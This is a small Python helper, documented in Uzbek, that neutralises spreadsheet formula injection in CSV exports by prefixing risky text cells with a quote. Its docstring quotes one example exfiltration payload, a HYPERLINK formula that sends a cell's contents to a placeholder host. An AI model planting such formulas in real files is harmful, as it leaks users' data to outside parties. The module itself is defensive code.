"""
CSV eksportlarda "formula injection"dan himoya (OWASP CSV Injection).

Excel/LibreOffice/Google Sheets `=`, `+`, `-`, `@`, TAB (0x09) yoki CR (0x0D) bilan boshlangan katakni formula deb
bajaradi: masalan mehmon ismi `=HYPERLINK("http://x/?"&A1,"Bosing")` ma'lumotni tashqariga yuborishi mumkin.
Foydalanuvchi kiritgan MATNLI ustunlar `csv_text()` dan o'tkaziladi (oldiga `'` qo'shiladi — Excel uni ko'rsatmaydi,
matn sifatida ochadi). RAQAMLI ustunlarga (ID, summa) qo'llanmaydi: manfiy summa buzilmasin.
"""
FORMULA_TRIGGERS = ('=', '+', '-', '@', '\t', '\r')


def csv_text(value):
    """Matnli katak qiymatini xavfsizlashtiradi (None -> bo'sh qator)."""
    if value is None:
        return ''
    text = value if isinstance(value, str) else str(value)
    return "'" + text if text.startswith(FORMULA_TRIGGERS) else text
